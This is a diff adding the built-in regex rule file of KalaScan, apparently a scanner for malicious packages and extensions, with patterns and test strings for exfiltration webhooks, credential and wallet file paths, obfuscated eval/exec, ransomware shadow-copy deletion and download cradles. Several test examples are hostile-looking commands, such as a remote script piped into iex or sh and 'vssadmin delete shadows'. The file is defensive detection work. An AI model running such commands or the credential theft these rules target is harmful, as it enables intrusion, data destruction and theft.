@@ -1,0 +1,676 @@
+# KalaScan built-in RegEx rules. Embedded at compile time (include_str!).
+#
+# id        stable identifier; never reuse or renumber (baselines and SARIF key on names, people on ids)
+# category  scoping: exfiltration/file_access = scripts + manifests, install_hook = setup.py, others = all scanned files
+# examples  `matches` / `ignores` are run as tests (cargo test rule_examples)
+
+[[rule]]
+id = "KS-EXF-001"
+name = "Discord Webhook"
+severity = "critical"
+category = "exfiltration"
+description = "Discord webhook URL — data exfiltration"
+pattern = '''discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_-]{30,}'''
+matches = ['''discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst''']
+
+[[rule]]
+id = "KS-EXF-002"
+name = "Telegram Bot API Token"
+severity = "critical"
+category = "exfiltration"
+description = "Telegram Bot API token — C2/exfiltration channel"
+pattern = '''(?:https?://)?api\.telegram\.org/bot\d{8,10}:[a-zA-Z0-9_-]{35,40}/'''
+matches = ['''https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm/sendMessage''']
+
+[[rule]]
+id = "KS-EXF-003"
+name = "Slack Webhook"
+severity = "high"
+category = "exfiltration"
+description = "Slack webhook URL — potential data exfiltration"
+pattern = '''hooks\.slack\.com/services/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+'''
+
+[[rule]]
+id = "KS-EXF-004"
+name = "Hardcoded IP Address"
+severity = "medium"
+category = "exfiltration"
+description = "Hardcoded IP address — potential C2 server"
+pattern = '''\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'''
+
+[[rule]]
+id = "KS-EXF-005"
+name = "AWS Access Key"
+severity = "critical"
+category = "exfiltration"
+description = "AWS Access Key ID detected — credential leak"
+# Word boundaries: AKIA-shaped runs inside base64 blobs are not keys.
+pattern = '''\bAKIA[0-9A-Z]{16}\b'''
+matches = ['''AKIA1234567890123456''', '''key = "AKIAQ3EGRZ7MXKXH4L5N"''']
+ignores = ['''fGh0AKIAAAB0AAAAAAAAAKMAa''']
+
+[[rule]]
+id = "KS-EXF-006"
+name = "AWS Secret Key"
+severity = "critical"
+category = "exfiltration"
+description = "AWS Secret Access Key detected — credential leak"
+pattern = '''(?i)(?:aws_secret_access_key|secretAccessKey)\s*[:=]\s*['"][a-zA-Z0-9/+=]{40}['"]'''
+
+[[rule]]
+id = "KS-EXF-007"
+name = "GitHub Token"
+severity = "critical"
+category = "exfiltration"
+description = "GitHub token detected — credential leak"
+pattern = '''ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22,}'''
+matches = ['''ghp_abcdefghijklmnopqrstuvwxyz1234567890''']
+
+[[rule]]
+id = "KS-EXF-008"
+name = "Generic API Key"
+severity = "high"
+category = "exfiltration"
+description = "Generic API key or secret detected"
+pattern = '''(?i)(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*['"][a-zA-Z0-9_-]{16,}['"]'''
+
+[[rule]]
+id = "KS-EXF-009"
+name = "Generic Webhook URL"
+severity = "medium"
+category = "exfiltration"
+description = "Generic webhook URL — potential exfiltration endpoint"
+pattern = '''https?://[a-zA-Z0-9.-]+/webhook(?:s)?/'''
+
+[[rule]]
+id = "KS-EXF-010"
+name = "Slack Bot Token"
+severity = "high"
+category = "exfiltration"
+description = "Slack bot token detected — credential leak"
+pattern = '''xox[baprs]-[0-9a-zA-Z-]{10,}'''
+
+[[rule]]
+id = "KS-ACC-001"
+name = "Browser Profile Access"
+severity = "critical"
+category = "file_access"
+description = "Browser profile/user data access — credential theft"
+pattern = '''(?i)(?:/AppData/Local/(?:Google/)?Chrome|/AppData/Roaming/Discord|Mozilla/Firefox/Profiles)'''
+
+# Wallet data dirs and wallet browser-extension IDs; bare words like
+# "wallet"/"phantom" matched PhantomJS polyfills in every Vue bundle.
+[[rule]]
+id = "KS-ACC-002"
+name = "Crypto Wallet Access"
+severity = "critical"
+category = "file_access"
+description = "Crypto wallet access — crypto theft indicator"
+pattern = '''(?i)(?:wallet\.dat|["'\\/]\.(?:bitcoin|ethereum|electrum)\b|Ethereum[\\/]keystore|exodus\.wallet|Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|ejbalbakoplchlghecdalmeeeajnimhm)'''
+matches = ['''path.join(home, ".ethereum", "keystore")''', '''Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn''']
+ignores = ['''e.g., PhantomJS 1.x''']
+
+[[rule]]
+id = "KS-ACC-003"
+name = "Password Manager Access"
+severity = "high"
+category = "file_access"
+description = "Credential file access detected"
+pattern = '''(?i)(?:passwords?\.txt|passwd|credentials\.dat|login\.json|\.npmrc|(?:^|[\\/"'])[.]env\b)'''
+matches = ['''fs.readFileSync(home + "/.env")''']
+ignores = ['''const home = process.env.HOME;''', '''vscode_2.env.appRoot''']
+
+# File names inside a browser profile; bare "Cookies" matched every
+# `_canUseCookies` / `disableCookies` identifier in telemetry SDKs.
+[[rule]]
+id = "KS-ACC-004"
+name = "Browser Database Access"
+severity = "high"
+category = "file_access"
+description = "Browser database — session/cookie theft"
+pattern = '''(?i:["'/\\](?:Login Data|Web Data|Local State)["'/\\]|cookies\.sqlite|logins\.json|key4\.db)|(?:Network|Default)[\\/]Cookies\b'''
+matches = ['''path.join(profile, "Login Data")''', '''Default\Network\Cookies''']
+ignores = ['''var cookies = require('./../helpers/cookies');''', '''U={_canUseCookies:void 0,disableCookies:P}''']
+
+[[rule]]
+id = "KS-ACC-005"
+name = "Discord Token Harvesting"
+severity = "critical"
+category = "file_access"
+description = "Discord token file access — account theft"
+pattern = '''(?i)(?:Discord[\\/]Local Storage[\\/]leveldb|discord\.ptb|discord\.canary)'''
+
+[[rule]]
+id = "KS-ACC-006"
+name = "SSH Key Access"
+severity = "high"
+category = "file_access"
+description = "SSH key access — unauthorized access risk"
+pattern = '''(?i)(?:/\.ssh/|id_rsa|id_dsa|authorized_keys|known_hosts)'''
+
+[[rule]]
+id = "KS-ACC-007"
+name = "Environment Variable Dump"
+severity = "medium"
+category = "file_access"
+description = "Environment variable access — may contain secrets"
+pattern = '''(?i)(?:os\.environ|process\.env|getenv\b)'''
+
+# Not `obj.eval(`; the regex crate has no look-behind, so the
+# preceding char is part of the match.
+[[rule]]
+id = "KS-EXE-001"
+name = "eval() Usage"
+severity = "high"
+category = "obfuscation"
+description = "eval() — arbitrary code execution risk"
+pattern = '''(?m)(?:^|[^.\w$\n])eval\s*\('''
+matches = ['''eval(user_input)''', '''x = eval(s)''']
+ignores = ['''window.eval(x)''', '''while ((match = tagRE.exec(text)))''']
+
+# Not `re.exec(` (JS RegExp), which is in nearly every bundle.
+[[rule]]
+id = "KS-EXE-002"
+name = "exec() Usage"
+severity = "high"
+category = "obfuscation"
+description = "exec() — arbitrary code execution risk"
+pattern = '''(?m)(?:^|[^.\w$\n])exec\s*\('''
+matches = ['''exec(code, ns, ns)''']
+ignores = ['''while ((match = tagRE.exec(text)))''']
+
+[[rule]]
+id = "KS-EXE-003"
+name = "b64decode + exec Chain"
+severity = "critical"
+category = "obfuscation"
+description = "Base64 decode + exec/eval chain — obfuscation"
+# Both must be calls, close together: a SQL keyword list ("from_base64 …
+# run") and a license banner used to match across whole minified lines.
+pattern = '''(?i)(?:(?:^|[^.\w$])(?:exec|eval)\s*\([^\n]{0,120}?(?:b64decode|from_base64|atob)\s*\(|(?:b64decode|from_base64|atob)\s*\([^\n]{0,120}?[^.\w$](?:exec|eval)\s*\()'''
+matches = ['''exec(base64.b64decode(payload))''', '''eval(atob(s))''', '''code = b64decode(blob); exec(code)''']
+ignores = ['''from_base64 from_days ftp full function general generated get_lock run''', '''atob(h)))}function l(h){return h.split(",").pop()}function c(h,m){var f=r.mapFileCommentRegex.exec(m)''']
+
+[[rule]]
+id = "KS-EXE-004"
+name = "nested b64decode"
+severity = "critical"
+category = "obfuscation"
+description = "Nested base64 decoding — multi-layer obfuscation"
+pattern = '''(?i)(?:base64\.b64decode\s*\(\s*base64|b64decode\s*\(\s*b64decode)'''
+
+[[rule]]
+id = "KS-EXE-005"
+name = "child_process (Node.js)"
+severity = "high"
+category = "obfuscation"
+description = "child_process — command injection or payload execution"
+pattern = '''(?:child_process\.exec|child_process\.execSync|child_process\.spawn)'''
+
+[[rule]]
+id = "KS-EXE-006"
+name = "subprocess (Python)"
+severity = "high"
+category = "obfuscation"
+description = "subprocess — command execution or payload"
+pattern = '''(?:subprocess\.(?:call|Popen|run|check_output|getoutput|check_call))'''
+matches = ['''subprocess.Popen(['cmd.exe']''', '''subprocess.call(['ls']''']
+
+[[rule]]
+id = "KS-EXE-007"
+name = "os.system"
+severity = "high"
+category = "obfuscation"
+description = "os.system() — shell command execution"
+pattern = '''os\.system\s*\('''
+
+[[rule]]
+id = "KS-EXE-008"
+name = "PowerShell Encoded Command"
+severity = "critical"
+category = "obfuscation"
+description = "PowerShell encoded command — obfuscated execution"
+pattern = '''(?i)(?:-EncodedCommand\s+[a-zA-Z0-9+/=]{50,}|powershell\s+.*-enc\b)'''
+matches = ['''powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA''']
+
+[[rule]]
+id = "KS-EXE-009"
+name = "Base64 Overuse"
+severity = "medium"
+category = "obfuscation"
+description = "Base64 module import — possible obfuscation"
+pattern = '''(?i)(?:from\s+base64\s+import|import\s+base64|require\(.base64.\))'''
+
+[[rule]]
+id = "KS-EXE-010"
+name = "Dynamic Import/Load"
+severity = "medium"
+category = "obfuscation"
+description = "Dynamic code loading — potential backdoor"
+pattern = '''(?i)(?:__import__\(|importlib|execScript|new Function)'''
+matches = ['''__import__('os')''']
+ignores = ['''setTimeout(vscode.reload, 1000)''']
+
+# 16+ consecutive escapes: short runs are regex char classes and
+# byte constants in every library.
+[[rule]]
+id = "KS-EXE-011"
+name = "Hex Encoding"
+severity = "high"
+category = "obfuscation"
+description = "Hex-encoded string sequence — obfuscated content"
+pattern = '''(?i)(?:\\x[0-9a-f]{2}){16,}'''
+matches = ['''\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41''']
+ignores = ['''/^[\x20\x09\x0a\x0d]*(.)/''']
+
+[[rule]]
+id = "KS-EXE-012"
+name = "XOR Decode Pattern"
+severity = "high"
+category = "obfuscation"
+description = "XOR decoding — obfuscation technique"
+pattern = '''(?i)(?:ord\(.[^)]+.\)\s*\^\s*|charCodeAt\(.[^)]+.\)\s*\^\s*)'''
+
+[[rule]]
+id = "KS-EXE-013"
+name = "Long Encoded String"
+severity = "medium"
+category = "obfuscation"
+description = "Very long encoded string — potential payload"
+pattern = '''[a-zA-Z0-9+/=]{200,}'''
+
+[[rule]]
+id = "KS-EXE-014"
+name = "os.popen"
+severity = "high"
+category = "obfuscation"
+description = "os.popen() — shell command execution"
+pattern = '''os\.popen\s*\('''
+
+[[rule]]
+id = "KS-EXE-015"
+# High, not critical: debuggers (debugpy's winappdbg) call these by design.
+name = "Process Injection"
+severity = "high"
+category = "obfuscation"
+description = "Windows process injection API calls — malware indicator"
+pattern = '''(?i)(?:VirtualAllocEx|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx|RtlCreateUserThread)'''
+
+# LoadLibraryA/GetProcAddress are in every native binding; static
+# triage already reports them as imports.
+[[rule]]
+id = "KS-EXE-016"
+name = "Reflective DLL Loading"
+severity = "critical"
+category = "obfuscation"
+description = "Reflective DLL loading — code injection technique"
+pattern = '''ReflectiveLoader'''
+matches = ['''ReflectiveLoader''']
+ignores = ['''GetProcAddress(h, "Foo")''']
+
+# Every crypto library calls `.encrypt(`; ransomware is the note and
+# the shadow-copy deletion, which stay critical.
+[[rule]]
+id = "KS-RAN-001"
+name = "Mass File Encryption"
+severity = "medium"
+category = "ransomware"
+description = "File encryption function — potential ransomware"
+pattern = '''(?i)(?:encrypt_file|encrypt_all|cipher\.encrypt|\.encrypt\s*\(|fernet\b.*encrypt)'''
+
+[[rule]]
+id = "KS-RAN-002"
+name = "Shadow Copy Deletion"
+severity = "critical"
+category = "ransomware"
+description = "Shadow copy/backup deletion — ransomware indicator"
+pattern = '''(?i)(?:vssadmin|wmic shadowcopy|bcdedit|bootsect|recovery\s+mode)'''
+matches = ['''vssadmin delete shadows /all /quiet''']
+
+# Quoted extension literal only: `.encoder` / `.encrypt(` are not file names.
+[[rule]]
+id = "KS-RAN-003"
+name = "Encrypted File Extension"
+severity = "high"
+category = "ransomware"
+description = "Encrypted file extension — ransomware victim pattern"
+pattern = '''(?i)["'`]\.(?:enc(?:rypted)?|locked|crypted|crypt|cry)["'`]'''
+matches = ['''file + '.locked'''']
+ignores = ['''return this.encoder.write(e)''']
+
+[[rule]]
+id = "KS-RAN-004"
+name = "Ransom Note"
+severity = "critical"
+category = "ransomware"
+description = "Ransom note text — ransomware indicator"
+pattern = '''(?i)(?:ransom(?:note|ware)|how_to_decrypt|readme_decrypt|your_files|your_data\b|pay\s+\d+\s+btc)'''
+
+[[rule]]
+id = "KS-RAN-005"
+name = "Bitcoin Payment Address"
+severity = "high"
+category = "ransomware"
+description = "Bitcoin address — potential ransom payment"
+pattern = '''\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'''
+
+[[rule]]
+id = "KS-SUP-001"
+name = "Post-Install Script"
+severity = "high"
+category = "supply_chain"
+description = "npm postinstall/preinstall — supply chain attack vector"
+pattern = '''(?i)"postinstall"\s*:\s*"|"preinstall"\s*:\s*"'''
+
+[[rule]]
+id = "KS-NET-001"
+name = "Local Network Server"
+severity = "medium"
+category = "network"
+description = "Starts a network listener — reachable by other hosts or by web pages via CSRF"
+pattern = '''(?:\bexpress\s*\(\s*\)|\b(?:http|https|net)\.createServer\s*\(|\bHTTPServer\s*\(|socketserver\.TCPServer|\.run\s*\(\s*host\s*=\s*["']0\.0\.0\.0)'''
+matches = ['''const app = express();''', '''http.createServer(handler)''']
+
+[[rule]]
+id = "KS-NET-002"
+name = "HTTP File Upload Handler"
+severity = "medium"
+category = "network"
+description = "Accepts file uploads over HTTP"
+pattern = '''(?:\bmulter\s*\(|\bformidable\s*\(|\bbusboy\b|\bupload\.(?:single|array|fields)\s*\()'''
+matches = ['''var upload = multer({ dest: tmp });''']
+
+[[rule]]
+id = "KS-FSW-001"
+name = "Archive Extraction"
+severity = "medium"
+category = "file_write"
+description = "Extracts archive entries to disk"
+pattern = '''(?:\bzip\.files\b|\.entryName\b|\bentry\.fileName\b|\.extractAllTo\s*\(|\.extractall\s*\(|\btarfile\.open\s*\(|\bzipfile\.ZipFile\s*\()'''
+matches = ['''for (let filename in zip.files) {''']
+
+[[rule]]
+id = "KS-SUP-002"
+name = "Remote Script Download"
+severity = "high"
+category = "supply_chain"
+description = "Remote script download — payload delivery"
+pattern = '''(?i)(?:curl\s+-s(?:SL)?\s+https?://|wget\s+-q\s+https?://)\S+\.(?:ps1|sh|bat|py)\b'''
+
+[[rule]]
+id = "KS-SUP-003"
+name = "URL Fetch Command"
+severity = "medium"
+category = "supply_chain"
+description = "URL fetching — possible external payload download"
+pattern = '''(?i)(?:Invoke-WebRequest|curl\b|wget\b|fetch\(|axios\.(?:get|post)|request\.get|\bhttps?\.(?:request|get)\s*\(|requests\.(?:get|post|put)\s*\(|urlopen\s*\(|urllib\.request|http\.client|XMLHttpRequest|\bdns\.(?:lookup|resolve\w*)\s*\()'''
+
+[[rule]]
+id = "KS-SUP-004"
+name = "Hidden Directory Script"
+severity = "medium"
+category = "supply_chain"
+description = "Script in hidden directory — suspicious"
+pattern = '''(?i)[\\/]\.\w+[\\/](?:install|setup|config)'''
+
+[[rule]]
+id = "KS-EXF-011"
+name = "VS Code Session/Token Stealing"
+severity = "critical"
+category = "exfiltration"
+description = "Accessing VS Code authentication session — token theft indicator"
+pattern = '''(?i)vscode\.authentication\.getSession\s*\('''
+matches = ['''const session = await vscode.authentication.getSession('github', ['repo']);''']
+
+[[rule]]
+id = "KS-ACC-008"
+name = "VS Code Clipboard Harvesting"
+severity = "high"
+category = "file_access"
+description = "Reading clipboard contents silently in extension"
+pattern = '''(?i)vscode\.env\.clipboard\.readText\s*\('''
+matches = ['''const text = await vscode.env.clipboard.readText();''']
+
+[[rule]]
+id = "KS-ACC-009"
+name = "VS Code Workspace File Reading"
+severity = "medium"
+category = "file_access"
+description = "Reading workspace files via VS Code API"
+pattern = '''(?i)vscode\.workspace\.fs\.readFile\s*\('''
+matches = ['''const file = await vscode.workspace.fs.readFile(uri);''']
+
+[[rule]]
+id = "KS-SUP-005"
+name = "Installed Extension Tampering"
+severity = "critical"
+category = "supply_chain"
+description = "References another installed extension's directory — supply-chain tampering"
+# Not package.json: npm writes install paths into `_where` / `_location`.
+pattern = '''(?i)[\\/]\.vscode[\\/]extensions[\\/]'''
+exclude_files = ["package.json"]
+matches = ['''let dir = homedir + "/.vscode/extensions/ecm3401.example-api-extension-0.0.1";''', '''let dir = home + '\.vscode\extensions\x.y-1.0.0';''']
+
+[[rule]]
+id = "KS-SUP-006"
+name = "VS Code Wildcard Activation"
+severity = "medium"
+category = "supply_chain"
+description = "Extension executes automatically on startup without user trigger"
+pattern = '''(?i)"activationEvents"\s*:\s*\[[^\]]*["'](?:\*|onStartupFinished)["']'''
+matches = ['''"activationEvents": [ "*", "onCommand:myExt.start" ]''']
+
+[[rule]]
+id = "KS-EXE-017"
+name = "JetBrains Dynamic Classloading"
+severity = "critical"
+category = "obfuscation"
+description = "Dynamic Java/Kotlin classloader — payload injection indicator"
+pattern = '''(?i)(?:URLClassLoader|ClassLoader\.defineClass|DexClassLoader)\s*\('''
+matches = ['''URLClassLoader loader = new URLClassLoader(urls);''']
+
+[[rule]]
+id = "KS-EXE-018"
+name = "JetBrains Process Execution"
+severity = "high"
+category = "obfuscation"
+description = "Executing OS processes from plugin code"
+pattern = '''(?i)(?:Runtime\.getRuntime\(\)\.exec|ProcessBuilder)\s*\('''
+matches = ['''Runtime.getRuntime().exec(cmd);''']
+
+[[rule]]
+id = "KS-EXE-019"
+name = "JetBrains Malicious Reflection"
+severity = "medium"
+category = "obfuscation"
+description = "Java reflection to bypass access control or security managers"
+pattern = '''(?i)(?:Method\.invoke|Field\.setAccessible)\s*\('''
+
+[[rule]]
+id = "KS-EXF-012"
+name = "JetBrains Raw Socket Exfiltration"
+severity = "medium"
+category = "exfiltration"
+description = "Raw networking call for beaconing or exfiltration"
+pattern = '''(?i)java\.net\.(?:Socket|HttpURLConnection|URL)\s*'''
+
+[[rule]]
+id = "KS-SUP-007"
+name = "Browser Extension Dangerous Permissions"
+severity = "high"
+category = "supply_chain"
+description = "High-risk browser extension permission targeting all network traffic or debugging"
+pattern = '''(?i)"(?:permissions|optional_permissions)"\s*:\s*\[[^\]]*["'](?:\*://\*|<all_urls>|webRequestBlocking|debugger|nativeMessaging)["']'''
+matches = ['''"permissions": ["<all_urls>", "storage"]''']
+
+# `unsafe-eval` only matters inside a manifest CSP, not in a warning string.
+[[rule]]
+id = "KS-EXE-020"
+name = "Browser Extension Dynamic Code Execution"
+severity = "high"
+category = "obfuscation"
+description = "Dynamic script injection or CSP unsafe-eval in extension"
+pattern = '''(?i)(?:chrome\.tabs\.executeScript|"content_security_policy"[^\n]*unsafe-eval)'''
+matches = ['''chrome.tabs.executeScript(tabId, { code: payload });''', '''"content_security_policy": "script-src 'self' 'unsafe-eval'"''']
+ignores = ['''warn('prohibits unsafe-eval')''']
+
+[[rule]]
+id = "KS-EXF-013"
+name = "Browser Extension Keystroke Logger"
+severity = "high"
+category = "exfiltration"
+description = "Key event listener indicating potential keylogger"
+pattern = '''(?i)addEventListener\s*\(\s*["']key(?:down|press|up)["']'''
+
+[[rule]]
+id = "KS-ACC-010"
+name = "Browser Extension Cookie/Token Theft"
+severity = "high"
+category = "file_access"
+description = "Harvesting browser cookies or local extension storage"
+pattern = '''(?i)chrome\.(?:cookies\.getAll|storage\.local\.get)'''
+
+# Request-capture / OAST hosts match anywhere (they are used as DNS
+# suffixes: f"{data}.x.oast.fun"). Tunnels and file drops need a
+# URL or `hostname:` context: bundled Public Suffix Lists quote
+# "ngrok.io" / "trycloudflare.com" as plain strings.
+[[rule]]
+id = "KS-EXF-014"
+name = "Exfiltration Service Endpoint"
+severity = "high"
+category = "exfiltration"
+description = "Request-capture / tunnel / file-drop service used to receive stolen data"
+pattern = '''(?i)(?:\b(?:webhook\.site|requestcatcher\.com|m\.pipedream\.net|interact\.sh|oast\.(?:pro|live|site|online|fun|me)\b|oast-[a-z]+\.|burpcollaborator\.net|oastify\.com|canarytokens\.com|beeceptor\.com|requestbin\.(?:net|com)|hookbin\.com)|(?:(?:https?|wss?)://|hostname["']?\s*[:=]\s*["'`])(?:[\w-]+\.)*(?:ngrok(?:-free)?\.(?:io|app|dev)|lhr\.life|localhost\.run|serveo\.net|trycloudflare\.com|api\.telegram\.org|transfer\.sh|catbox\.moe|bashupload\.com|filev2\.getsession\.org))'''
+matches = ['''https://webhook.site/0b1c''', '''https://abc.m.pipedream.net''', '''hostname: `api.telegram.org`,''', '''socket.gethostbyname(f"{d}.abc.oast.fun")''']
+ignores = ['''"nfshost.com","ngrok.io","nh-serv.co.uk"''']
+
+[[rule]]
+id = "KS-EXF-015"
+name = "Public IP URL"
+severity = "high"
+category = "exfiltration"
+description = "URL pointing at a raw public IP — typical C2 / payload host"
+pattern = '''(?i)https?://\d{1,3}(?:\.\d{1,3}){3}'''
+matches = ['''http://91.92.242.133/support''']
+
+[[rule]]
+id = "KS-REC-001"
+name = "IP Lookup Service"
+severity = "medium"
+category = "recon"
+description = "Public IP lookup — victim fingerprinting"
+pattern = '''(?i)\b(?:api\.ipify\.org|ipinfo\.io|ip-api\.com|icanhazip\.com|ifconfig\.me|checkip\.amazonaws\.com|api\.myip\.com|ipapi\.co)\b'''
+
+[[rule]]
+id = "KS-REC-002"
+name = "Host Reconnaissance"
+severity = "medium"
+category = "recon"
+description = "Collects host / user identity"
+pattern = '''(?:\bos\.(?:hostname|userInfo|networkInterfaces)\s*\(|getpass\.getuser\s*\(|socket\.gethostname\s*\(|platform\.node\s*\(|os\.getlogin\s*\(|psutil\.net_if_addrs)'''
+matches = ['''const u = os.userInfo().username''']
+
+[[rule]]
+id = "KS-SUP-008"
+name = "Remote Executable Download"
+severity = "high"
+category = "supply_chain"
+description = "Downloads an executable or script from the internet"
+pattern = '''(?i)(?:https?://[^\s"'<>()]+\.(?:exe|dll|scr|msi|bat|cmd|ps1|vbs|hta|elf|dmg|pkg|apk|sh)(?:[?#"'\s)]|$)|cdn\.discordapp\.com/attachments/|certutil(?:\.exe)?\s+-urlcache|bitsadmin(?:\.exe)?\s+/transfer)'''
+matches = ['''set "EXE_URL=http://paxfallow.ru/Lightshot.exe"''']
+ignores = ['''https://github.com/x/y/releases/download/v1/tool.zip''']
+
+# `\x20` too: obfuscators escape the spaces in these strings.
+[[rule]]
+id = "KS-EXE-021"
+name = "Shell Process Start"
+severity = "high"
+category = "obfuscation"
+description = "Starts a program or evaluates text from a shell script"
+pattern = '''(?i)(?:\bstart\s+""|\bStart-Process\b|\bInvoke-Expression\b|\biex\s*[\(\$]|\|(?:\s|\\x20)*iex\b|cmd(?:\.exe)?(?:\s|\\x20)+/c(?:\s|\\x20))'''
+matches = ['''|\x20iex''', '''start "" /B "%EXE%"''']
+
+[[rule]]
+id = "KS-NET-003"
+name = "Raw Socket Connection"
+severity = "medium"
+category = "network"
+description = "Opens a raw TCP connection"
+pattern = '''(?:new\s+net\.Socket\s*\(|\bnet\.(?:connect|createConnection)\s*\(|\.connect\(\(\s*["']?\d)'''
+
+[[rule]]
+id = "KS-EXE-022"
+name = "Detached Process Spawn"
+severity = "medium"
+category = "obfuscation"
+description = "Starts a process that outlives its parent"
+pattern = '''\bdetached\s*:\s*true'''
+
+[[rule]]
+id = "KS-EXE-023"
+name = "Make File Executable"
+severity = "medium"
+category = "obfuscation"
+description = "Marks a file executable"
+pattern = '''(?:chmodSync\([^)]*0o?7[57]5|chmod\s+(?:\+x|7[57]5)|os\.chmod\([^)]*0o7[57]5)'''
+
+[[rule]]
+id = "KS-EXE-024"
+name = "Obfuscator.io Output"
+severity = "high"
+category = "obfuscation"
+description = "javascript-obfuscator output (_0x string-array decoder)"
+pattern = '''(?:var|const|let|function)\s+_0x[0-9a-f]{4,6}\b'''
+matches = ['''function _0x2470(){return _0x2e306f;}''']
+ignores = ['''var a=0x1f;''']
+
+[[rule]]
+id = "KS-ACC-011"
+name = "Wallet Seed / Private Key Handling"
+severity = "medium"
+category = "file_access"
+description = "Handles wallet seed phrases or private keys"
+pattern = '''(?i)\b(?:mnemonic|seed[ _-]?phrase|recovery[ _-]?phrase|private[ _-]?key)\b'''
+
+[[rule]]
+id = "KS-SUP-009"
+name = "setup.py Install Hook Override"
+severity = "medium"
+category = "supply_chain"
+description = "setup.py replaces the install/develop command — code runs at pip install"
+pattern = '''cmdclass\s*=\s*\{[^}]*['"](?:install|develop|egg_info)['"]'''
+matches = ['''cmdclass={
+    'install': PostInstallCommand,
+}''']
+ignores = ['''cmdclass={'build_ext': BuildExt}''']
+
+[[rule]]
+id = "KS-INS-001"
+name = "setup.py Install-time Execution"
+severity = "high"
+category = "install_hook"
+description = "setup.py runs shell commands at pip install"
+pattern = '''(?:subprocess\.|os\.system|os\.popen)'''
+
+# No `exec(`: `exec(open('pkg/version.py').read())` is the
+# standard version-reading idiom.
+[[rule]]
+id = "KS-INS-002"
+name = "setup.py Payload Decode/Fetch"
+severity = "high"
+category = "install_hook"
+description = "setup.py decodes a payload or opens a connection at pip install"
+pattern = '''(?:b64decode|\bzlib\.decompress|__import__\(\s*['\x22](?:base64|zlib|marshal)|urllib\.request|urlopen\(|requests\.(?:get|post)\s*\(|socket\.socket\s*\()'''
+matches = ['''exec(zlib.decompress(base64.b64decode(blob)))''']
+ignores = ['''exec(open('pkg/version.py').read())''']
+
+# No `\b` before the verb: in `\x22irm` the `2` and `i` are both word chars.
+[[rule]]
+id = "KS-EXE-025"
+name = "Download Cradle (fetch piped to interpreter)"
+severity = "critical"
+category = "obfuscation"
+description = "Fetches a remote script and pipes it straight into an interpreter"
+pattern = '''(?i)(?:^|[^a-z])(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)(?:\s|\\x20)+[^|\n]{0,200}?https?://[^|\n]{0,200}?\|(?:\s|\\x20)*(?:iex|Invoke-Expression|sh|bash|zsh|python3?|node)\b'''
+matches = ['''powershell -Command "irm https://evil.example/a | iex"''', '''powershell\x20-Command\x20\x22irm\x20https://e.x/a\x20|\x20iex\x22''', '''curl -fsSL https://get.example.sh | sh''']
+ignores = ['''curl -o out.zip https://example.com/a.zip''']
